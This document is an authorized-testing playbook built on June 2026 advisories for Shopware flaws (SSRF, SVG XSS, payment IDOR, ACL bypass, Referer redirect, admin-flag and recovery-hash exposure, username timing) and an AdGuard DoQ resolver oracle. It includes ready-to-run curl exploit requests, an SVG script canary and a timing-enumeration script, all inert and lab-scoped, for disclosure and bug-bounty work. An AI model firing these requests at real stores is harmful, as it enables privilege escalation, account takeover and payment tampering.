# Shopware Store API/admin/media boundaries and AdGuard DoQ source-port oracle

## Operator value

GitHub Advisory Database published a late June 4, 2026 batch with durable lessons for authorized e-commerce and DNS-resolver assessments:

- Shopware media external-link handling accepts authenticated admin-supplied URLs and performs server-side `HEAD` requests without the private/reserved IP filtering used by a sibling upload flow: [GHSA-gq96-5pfx-f4vc / CVE-2026-48013](https://github.com/advisories/GHSA-gq96-5pfx-f4vc).
- Shopware allows SVG upload in media workflows without SVG content sanitization, creating a stored browser execution boundary when uploaded media is viewed inline: [GHSA-xvhc-gm7j-mhmc / CVE-2026-48015](https://github.com/advisories/GHSA-xvhc-gm7j-mhmc).
- Shopware Store API payment handling lets a customer or guest context submit a foreign `orderId` to `/store-api/handle-payment`: [GHSA-9v5m-39wh-5chq / CVE-2026-48016](https://github.com/advisories/GHSA-9v5m-39wh-5chq).
- Shopware Admin API order-state transition routes can process direct API calls from users who cannot perform normal order updates: [GHSA-f8q6-3g5w-jjr6 / CVE-2026-48014](https://github.com/advisories/GHSA-f8q6-3g5w-jjr6).
- Shopware SSO fallback redirects trust the request `Referer` header when expected SSO state is absent: [GHSA-4x3x-869w-xx3m / CVE-2026-48012](https://github.com/advisories/GHSA-4x3x-869w-xx3m).
- Shopware user-management APIs expose privilege and recovery-token boundary mistakes: low-privileged `user:create` / `user:update` can set `admin: true`, and `user_recovery:read` can expose password-recovery hashes: [GHSA-v39m-97p8-gqg7 / CVE-2026-48010](https://github.com/advisories/GHSA-v39m-97p8-gqg7), [GHSA-8v9p-g828-v98f / CVE-2026-48009](https://github.com/advisories/GHSA-8v9p-g828-v98f).
- Shopware admin login timing can disclose valid administrator usernames and should be treated as an enrichment primitive only when timing statistics are strong: [GHSA-7w52-7jvm-m9vw / CVE-2026-48011](https://github.com/advisories/GHSA-7w52-7jvm-m9vw).
- AdGuard Home / `dnsproxy` DoQ-to-UDP forwarding collapses backend DNS transaction ID entropy and exposes a source-port oracle on the tested path: [GHSA-xgx4-4h9w-53pv / CVE-2026-47703](https://github.com/advisories/GHSA-xgx4-4h9w-53pv).

The reusable pattern: compare sibling routes and privilege models, then prove whether attacker-controlled input crosses into a more trusted subsystem: server-side fetches, inline media rendering, order/payment state, admin-role writes, password-recovery secrets, trusted-origin redirects, or resolver backend entropy.

## Affected surfaces

| Surface | Affected versions | Fixed version noted by advisory | Boundary to test |
| --- | --- | --- | --- |
| Shopware media external-link SSRF | `shopware/core` or `shopware/platform >= 6.7.0.0 < 6.7.10.1` | release tag `v6.7.10.1` referenced | admin media URL to server-side `HEAD` request target |
| Shopware SVG upload XSS | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | media upload to same-origin inline SVG rendering |
| Shopware Store API payment IDOR | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | customer or guest context to foreign order payment flow |
| Shopware Admin API order transition ACL bypass | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | low-privileged admin token to order-state mutation action |
| Shopware SSO Referer redirect | `shopware/core` or `shopware/platform >= 6.7.3.0 < 6.7.10.1` | release tag `v6.7.10.1` referenced | unauthenticated request metadata to `/api/oauth/` redirect |
| Shopware admin flag and recovery hash issues | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | narrow admin ACLs to full-admin or recovery-token capability |
| AdGuard Home / dnsproxy DoQ-to-UDP forwarding | `github.com/AdguardTeam/AdGuardHome <= 0.107.74`, `github.com/AdguardTeam/dnsproxy < 0.81.3` | no patched version listed in GHSA version ranges at publication time; dnsproxy fix commit referenced | client DoQ query to backend UDP transaction ID/source-port behavior |

## Recon workflow

1. Confirm scope explicitly permits e-commerce state changes, admin APIs, SSO redirect testing, media rendering, payment-flow testing, and DNS resolver oracle work. Use lab stores, test orders, test payment methods, and disposable resolver instances unless the program has written production-safe rules.
2. Identify Shopware and AdGuard versions from lockfiles, container labels, admin banners, package metadata, or SBOMs:

   ```bash
   grep -R "shopware/core\|shopware/platform\|AdguardTeam/AdGuardHome\|AdguardTeam/dnsproxy" \
     composer.lock go.mod go.sum package-lock.json 2>/dev/null
   ```

3. For Shopware, map effective permissions before testing each route. Strong findings compare a denied baseline route with a successful action route under the same low-privileged token.
4. For payment and order tests, create two disposable orders under separate test identities. Do not use real customer orders, real shipment workflows, or live payment captures.
5. For AdGuard, validate only against an owned resolver or an explicitly authorized test endpoint. The reportable issue is entropy/oracle behavior on the DoQ listener forwarding to a UDP upstream, not generic DNS availability.

## Safe validation patterns

### Shopware media external-link SSRF

Use an internal callback listener you own inside the same lab network. Keep the target harmless and avoid cloud metadata endpoints unless explicitly authorized.

```bash
curl -i -s -X POST 'https://shopware.example.test/api/_action/media/external-link' \
  -H 'Authorization: Bearer LOW_PRIV_ADMIN_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"url":"http://127.0.0.1:8080/skillz-head-canary","mediaId":"00000000000000000000000000000000"}'
```

Evidence should show the low-privileged admin role, the target URL, the outbound `HEAD` request observed by the owned listener, and whether sibling upload paths reject the same private/reserved target.

### Shopware SVG stored XSS boundary

Use a non-exfiltrating SVG canary in a test media library:

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="220" height="40" onload="console.log('skillz-svg-canary')">
  <text x="10" y="25">skillz svg canary</text>
</svg>
```

A strong report captures upload acceptance, the served media URL, response headers, and browser evidence from a test account showing script-capable inline SVG interpretation. Do not steal cookies, tokens, or admin data.

### Shopware Store API foreign order payment trigger

Create `ORDER_A` for customer A and test from customer B or an unauthenticated guest context. Use a disabled/test payment method and stop at initiation evidence.

```bash
curl -i -s 'https://shopware.example.test/store-api/handle-payment' \
  -H 'sw-context-token: CUSTOMER_B_CONTEXT' \
  -H 'Content-Type: application/json' \
  --data '{"orderId":"ORDER_A_UUID","finishUrl":"https://example.invalid/finish","errorUrl":"https://example.invalid/error"}'
```

Report only if the server accepts, redirects, or mutates payment state for the foreign order without ownership checks or guest-order verification such as `deepLinkCode`.

### Shopware Admin API order-state ACL bypass

Compare a normal update denial with a transition-action success under the same low-privileged admin token:

```bash
# Baseline: should be denied for an account without order:update.
curl -i -s -X PATCH 'https://shopware.example.test/api/order/ORDER_UUID' \
  -H 'Authorization: Bearer LOW_PRIV_ADMIN_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"customFields":{"skillz_canary":"baseline"}}'

# Candidate bypass: dedicated transition action.
curl -i -s -X POST 'https://shopware.example.test/api/_action/order/ORDER_UUID/state/process' \
  -H 'Authorization: Bearer LOW_PRIV_ADMIN_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{}'
```

Use a disposable order and capture before/after state from an authorized admin or database fixture. Do not transition production orders.

### Shopware SSO Referer redirect

Use a controlled destination and avoid credential collection:

```bash
curl -i -s 'https://shopware.example.test/api/oauth/sso/auth' \
  -H 'Referer: https://example.invalid/skillz-redirect-canary'
```

Evidence should include `Location`, meta refresh body if present, scheme handling, and whether same-origin restrictions are absent.

### Shopware admin flag and recovery-hash boundaries

Use only a lab low-privileged admin account and a disposable victim admin account.

- For `admin: true`, prove that the low-privileged token cannot perform existing admin-only actions, then create or update a disposable user with an `admin` boolean and show the resulting role change.
- For recovery hashes, trigger recovery for the disposable victim, query only the test `user-recovery` entity, and demonstrate that the hash is readable by an account with only `user_recovery:read`. Stop before taking over a real account.

### Shopware username timing enrichment

Treat this as a secondary signal, not a standalone critical report. Use repeated samples, randomize candidate order, and include network jitter baselines:

```bash
python3 - <<'PY'
import json, random, statistics, time, urllib.request
url = 'https://shopware.example.test/api/oauth/token'
candidates = ['known-test-admin@example.invalid', 'missing-skillz-canary@example.invalid']
results = {c: [] for c in candidates}
for _ in range(30):
    random.shuffle(candidates)
    for user in candidates:
        body = json.dumps({'grant_type':'password','client_id':'administration','username':user,'password':'wrong-skillz-canary'}).encode()
        req = urllib.request.Request(url, data=body, headers={'Content-Type':'application/json'}, method='POST')
        t0 = time.perf_counter()
        try: urllib.request.urlopen(req, timeout=5).read()
        except Exception: pass
        results[user].append(time.perf_counter() - t0)
for user, vals in results.items():
    print(user, 'median=', round(statistics.median(vals), 4), 'samples=', len(vals))
PY
```

Include statistical separation and rate limits. Do not brute-force broad username lists.

### AdGuard DoQ-to-UDP resolver oracle

Build this in a local lab with a DoQ listener forwarding to a UDP upstream you control. The safe proof is passive observation of backend DNS IDs and source ports plus a client-visible oracle differential; do not poison public DNS caches.

1. Configure AdGuard Home or `dnsproxy` to accept DoQ from the client and forward to a UDP listener you own.
2. Send repeated unique subdomain queries from the DoQ client.
3. Capture backend UDP packets and record whether transaction IDs collapse to a constant value and whether quoted-port ICMP behavior distinguishes the active backend source port.
4. Report repeatability, product version, listener/upstream configuration, packet captures with unrelated traffic removed, and why the test stayed inside owned infrastructure.

## Evidence to capture

- Advisory ID, exact package/version evidence, deployment path, and enabled feature or route.
- Role or token capability matrix: what the account should and should not be able to do.
- Minimal canary request/response pairs with secrets, session tokens, order identifiers, and customer data redacted.
- For browser findings: DOM/console evidence from a test account only.
- For order/payment findings: disposable order IDs, before/after state, and proof that no real payment, shipment, or customer workflow was touched.
- For DNS findings: lab topology, packet captures scoped to the test, query IDs/source ports, and repeatability notes.

## Report framing

Frame these as boundary failures, not vulnerable-version screenshots:

- Shopware media: one URL-handling route lacks the network-target validation applied elsewhere.
- Shopware SVG: an uploaded media file crosses into same-origin active content.
- Shopware Store/Admin APIs: object ownership and ACL checks differ between normal CRUD routes and dedicated action routes.
- Shopware identity: narrow administrative permissions expose secrets or write privileged fields.
- Shopware SSO: request metadata becomes a trusted redirect target under `/api/oauth/`.
- AdGuard: encrypted-client ingress loses backend UDP entropy when forwarded to a plain UDP upstream.

Keep all payloads inert and demonstrate impact in a lab or explicit test account.

## Sources

- GitHub Advisory Database: [GHSA-gq96-5pfx-f4vc / CVE-2026-48013](https://github.com/advisories/GHSA-gq96-5pfx-f4vc)
- Shopware project advisory: [GHSA-gq96-5pfx-f4vc](https://github.com/shopware/shopware/security/advisories/GHSA-gq96-5pfx-f4vc)
- GitHub Advisory Database: [GHSA-xvhc-gm7j-mhmc / CVE-2026-48015](https://github.com/advisories/GHSA-xvhc-gm7j-mhmc)
- Shopware project advisory: [GHSA-xvhc-gm7j-mhmc](https://github.com/shopware/shopware/security/advisories/GHSA-xvhc-gm7j-mhmc)
- GitHub Advisory Database: [GHSA-9v5m-39wh-5chq / CVE-2026-48016](https://github.com/advisories/GHSA-9v5m-39wh-5chq)
- Shopware project advisory: [GHSA-9v5m-39wh-5chq](https://github.com/shopware/shopware/security/advisories/GHSA-9v5m-39wh-5chq)
- GitHub Advisory Database: [GHSA-f8q6-3g5w-jjr6 / CVE-2026-48014](https://github.com/advisories/GHSA-f8q6-3g5w-jjr6)
- Shopware project advisory: [GHSA-f8q6-3g5w-jjr6](https://github.com/shopware/shopware/security/advisories/GHSA-f8q6-3g5w-jjr6)
- GitHub Advisory Database: [GHSA-4x3x-869w-xx3m / CVE-2026-48012](https://github.com/advisories/GHSA-4x3x-869w-xx3m)
- Shopware project advisory: [GHSA-4x3x-869w-xx3m](https://github.com/shopware/shopware/security/advisories/GHSA-4x3x-869w-xx3m)
- GitHub Advisory Database: [GHSA-v39m-97p8-gqg7 / CVE-2026-48010](https://github.com/advisories/GHSA-v39m-97p8-gqg7)
- Shopware project advisory: [GHSA-v39m-97p8-gqg7](https://github.com/shopware/shopware/security/advisories/GHSA-v39m-97p8-gqg7)
- GitHub Advisory Database: [GHSA-8v9p-g828-v98f / CVE-2026-48009](https://github.com/advisories/GHSA-8v9p-g828-v98f)
- Shopware project advisory: [GHSA-8v9p-g828-v98f](https://github.com/shopware/shopware/security/advisories/GHSA-8v9p-g828-v98f)
- GitHub Advisory Database: [GHSA-7w52-7jvm-m9vw / CVE-2026-48011](https://github.com/advisories/GHSA-7w52-7jvm-m9vw)
- Shopware project advisory: [GHSA-7w52-7jvm-m9vw](https://github.com/shopware/shopware/security/advisories/GHSA-7w52-7jvm-m9vw)
- GitHub Advisory Database: [GHSA-xgx4-4h9w-53pv / CVE-2026-47703](https://github.com/advisories/GHSA-xgx4-4h9w-53pv)
- AdGuard Home project advisory: [GHSA-xgx4-4h9w-53pv](https://github.com/AdguardTeam/AdGuardHome/security/advisories/GHSA-xgx4-4h9w-53pv)
- dnsproxy fix commit referenced by the advisory: [f00d992ce9567a50f596853978ad6500acfdcf1d](https://github.com/AdguardTeam/dnsproxy/commit/f00d992ce9567a50f596853978ad6500acfdcf1d)
